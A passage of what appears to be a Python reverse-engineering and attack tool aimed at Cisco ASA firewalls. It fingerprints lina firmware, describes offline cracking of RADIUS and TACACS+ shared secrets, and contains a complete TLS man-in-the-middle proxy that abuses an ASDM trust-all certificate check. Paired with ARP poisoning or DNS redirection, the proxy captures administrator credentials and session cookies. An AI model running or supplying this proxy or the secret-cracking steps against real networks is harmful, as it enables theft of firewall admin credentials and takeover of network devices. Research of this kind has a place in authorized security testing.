        for name, pattern in LINA_STRING_ANCHORS.items():
            off = data.find(pattern)
            if off >= 0:
                anchors[name] = hex(off)

        # ARM64: CMP Wn, #imm  encoding = 0x7100001F | (imm << 10) | (Rn << 5)
        # B.EQ encoding: 0x54000000 | (offset19 << 5)
        # Look for CMP Wn, #1 followed within 8 bytes by B.EQ
        cmp1_pattern_word = 0x7100041F  # CMP Wn, #1 where n varies — mask needed
        dispatch_candidates = []
        for i in range(0, len(data) - 16, 4):
            word = struct.unpack_from('<I', data, i)[0]
            # CMP Wn, #1: encoding 0x7100 04xx where xx = Wn (bits 4:0)
            if (word & 0xFFFFFFE0) == 0x71000400:
                next_word = struct.unpack_from('<I', data, i + 4)[0]
                # B.EQ: top 24 bits = 0x54xxxxxx (bits [31:24] = 0x54, bit[0]=0)
                if (next_word >> 24) == 0x54 and (next_word & 1) == 0:
                    dispatch_candidates.append(hex(i))

        return {
            'string_anchors_found': anchors,
            'dispatch_candidates_cmp1_beq': dispatch_candidates[:20],
            'note': (
                'Candidates = addresses of CMP Wn,#1 / B.EQ pairs. '
                'Cross with ADRP+ADD xrefs to Access-Accept string to confirm dispatcher.'
            ),
            'prologue_count': len(self.scan_arm64_prologue_offsets(data)),
        }

    def run(self) -> list[dict]:
        if self.binary_path:
            return self.analyze_binary()

        # No binary: emit methodology and known attack surface
        self._finding('LINA_RE_METHODOLOGY', 'INFO',
            'Cisco ASA lina ARM64 RE methodology',
            'No binary supplied. The following documents the static analysis approach for the '
            'RADIUS/TACACS+ attack surface in the lina process.',
            {
                'arm64_calling_convention': ARM64_REGS,
                'string_anchors':           list(LINA_STRING_ANCHORS.keys()),
                'radius_functions':         list(LINA_RADIUS_FUNCTIONS.keys()),
                'static_analysis_steps':    list(STATIC_ANALYSIS_METHODOLOGY.keys()),
                'aaa_state_machine':        LINA_AAA_STATE_MACHINE['x86_64_branch_table_pattern'],
            })

        self._finding('RADIUS_PASSWORD_XOR_ORACLE', 'HIGH',
            'RADIUS User-Password offline brute-force',
            'RFC 2865 §5.2: User-Password = plaintext XOR MD5(shared_secret + authenticator). '
            'A captured Access-Request + known password → offline PSK recovery. '
            'With PSK: decrypt any Access-Request on the wire to recover VPN user passwords.',
            {
                'attack_class':   'offline-brute-force',
                'requires':       'captured RADIUS Access-Request + known test password',
                'defense':        'RadSec (TLS over RADIUS, RFC 6614); rotate shared secrets; use EAP-TLS',
                'function':       'radius_crack_shared_secret()',
            })

        self._finding('TACACS_BODY_ORACLE', 'HIGH',
            'TACACS+ body decryption via known-plaintext',
            'TACACS+ body encrypted with MD5 chain keyed on shared key + session_id. '
            'First authen_start packet has partially predictable plaintext '
            '(authen_type=0x01, priv_lvl=0x00, authen_method=0x06, service=0x01). '
            'Offline brute-force of TACACS+ key from captured packet.',
            {
                'known_plaintext_offset': TACACS_BODY_START_FIELDS,
                'function': 'verify_tacacs_decrypt()',
            })

        self._finding('LINA_X86_64_RE_APPROACH', 'INFO',
            'Recommended static RE approach for stripped x86-64 lina binary',
            'Ghidra/radare2 + x86-64 SysV ABI awareness. '
            'Start from string xrefs to AAA anchor strings (LEA RIP-relative) → walk call graph backward. '
            'Args in RDI/RSI/RDX; struct fields accessed as MOV [rdi+offset]. '
            'Shared secret in aaa_server_t.secret at fixed struct offset — find via MD5 CALL chain. '
            'Confirmed 9.22.2.32: Class attr parse fn at 0x3a4bda0, strstr("OU=") at 0x3a4bee6.',
            {
                'methodology': STATIC_ANALYSIS_METHODOLOGY,
                'binary_targets': self.TARGETS,
                'firmware_extraction': (
                    'binwalk -e asa*.bin  →  find . -name lina -type f  →  '
                    'file lina  →  objdump -d lina'
                ),
            })

        return self._findings


# ─── ASDM MITM PROXY (weaponizes av.class trust-all bypass) ─────────────────
#
# av.class checkServerTrusted: Code length=1, opcode=0xb1 (return void).
# The ASDM Java client silently accepts ANY TLS certificate with no warning.
#
# Attack flow:
#   1. ARP-poison or DNS-redirect ASA management IP toward this proxy
#   2. Proxy presents any self-signed cert; ASDM accepts it (trust-all)
#   3. Proxy relays to real ASA — captures admin credentials + session cookies
#
# Binary evidence:
#   av.class CAFEBABE @ 0x00213f62 in 1265F6 blob (asdm-7161.bin)
#   checkServerTrusted: 0: return  (javap confirmed)
#   av$1 HostnameVerifier: verify() also returns true unconditionally
#
# Usage (authorized lab/controlled env only):
#   python3 cisco_asa_lina_re.py mitm --listen 0.0.0.0:443 \
#       --target <ASA_MGMT_IP>:443 --cert proxy.pem --key proxy.key

import threading

class ASDMMitmProxy:
    """
    SSL MITM proxy targeting the ASDM client→ASA management interface.
    Exploits av.class trust-all TrustManager (confirmed asdm-7161.bin).
    """

    BINARY_EVIDENCE = {
        'asdm_version':    '7.16(1)',
        'av_class_offset': 0x00213f62,
        'bypass_method':   'checkServerTrusted',
        'bytecode':        '0: return',
        'code_length':     1,
        'hostname_bypass': 'av$1.verify() also unconditional return true',
    }

    def __init__(self, listen_addr: str, listen_port: int,
                 target_host: str, target_port: int,
                 certfile: str, keyfile: str):
        self.listen_addr = listen_addr
        self.listen_port = listen_port
        self.target_host = target_host
        self.target_port = target_port
        self.certfile    = certfile
        self.keyfile     = keyfile
        self._captures: list[dict] = []

    def _handle(self, client_raw: 'socket.socket'):
        import ssl as _ssl
        ctx_server = _ssl.SSLContext(_ssl.PROTOCOL_TLS_SERVER)
        ctx_server.load_cert_chain(self.certfile, self.keyfile)
        ctx_client = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
        ctx_client.check_hostname = False
        ctx_client.verify_mode = _ssl.CERT_NONE

        try:
            client_tls = ctx_server.wrap_socket(client_raw, server_side=True)
        except Exception:
            client_raw.close()
            return

        try:
            remote_raw = socket.create_connection((self.target_host, self.target_port), timeout=10)
            remote_tls = ctx_client.wrap_socket(remote_raw, server_hostname=self.target_host)
        except Exception:
            client_tls.close()
            return

        try:
            while True:
                data = client_tls.recv(16384)
                if not data:
                    break
                self._intercept(data, direction='client→asa')
                remote_tls.sendall(data)
                resp = remote_tls.recv(16384)
                if not resp:
                    break
                self._intercept(resp, direction='asa→client')
                client_tls.sendall(resp)
        except Exception:
            pass
        finally:
            client_tls.close()
            remote_tls.close()

    def _intercept(self, data: bytes, direction: str):
        txt = data.decode(errors='replace')
        entry = {'direction': direction, 'len': len(data), 'head': txt[:400]}
        self._captures.append(entry)
        # Flag HTTP Basic auth headers
        if 'Authorization: Basic ' in txt:
            import base64
            for line in txt.splitlines():
                if line.startswith('Authorization: Basic '):
                    try:
                        creds = base64.b64decode(line.split()[-1]).decode(errors='replace')
                        entry['CREDS_CAPTURED'] = creds
                        print(f'[ASDM-MITM] CREDENTIALS: {creds}')
                    except Exception:
                        pass
        # Flag session cookies
        if 'Set-Cookie:' in txt or 'ASDM_SESSION' in txt:
            entry['SESSION_MATERIAL'] = True
            print(f'[ASDM-MITM] SESSION MATERIAL captured ({len(data)}b)')

    def run(self):
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((self.listen_addr, self.listen_port))
        srv.listen(10)
        print(f'[ASDM-MITM] listening {self.listen_addr}:{self.listen_port} '
              f'→ {self.target_host}:{self.target_port}')
        print(f'[ASDM-MITM] exploits av.class trust-all bypass (asdm-7161.bin @0x213f62)')
        while True:
            conn, _ = srv.accept()
            threading.Thread(target=self._handle, args=(conn,), daemon=True).start()

    @property
    def captures(self) -> list[dict]:
        return self._captures


if __name__ == '__main__':
    import json, sys
    if len(sys.argv) > 1 and sys.argv[1] == 'mitm':
        import argparse
        p = argparse.ArgumentParser()
        p.add_argument('--listen',  default='0.0.0.0:8443')
        p.add_argument('--target',  required=True)
        p.add_argument('--cert',    required=True)
        p.add_argument('--key',     required=True)
        args = p.parse_args(sys.argv[2:])
        la, lp = args.listen.rsplit(':', 1)
        th, tp = args.target.rsplit(':', 1)
        ASDMMitmProxy(la, int(lp), th, int(tp), args.cert, args.key).run()
    else:
        binary = sys.argv[1] if len(sys.argv) > 1 else None
        obj    = CiscoASALinaRE(binary_path=binary)
        findings = obj.analyze_binary()
        for f in findings:
            print(f"[{f['severity']}] {f['id']}: {f['title']}")
            print(f"  {f['detail'][:120]}")
            if f.get('evidence'):
                first_key = next(iter(f['evidence']))
                print(f"  → {first_key}: {str(f['evidence'][first_key])[:80]}")
            print()
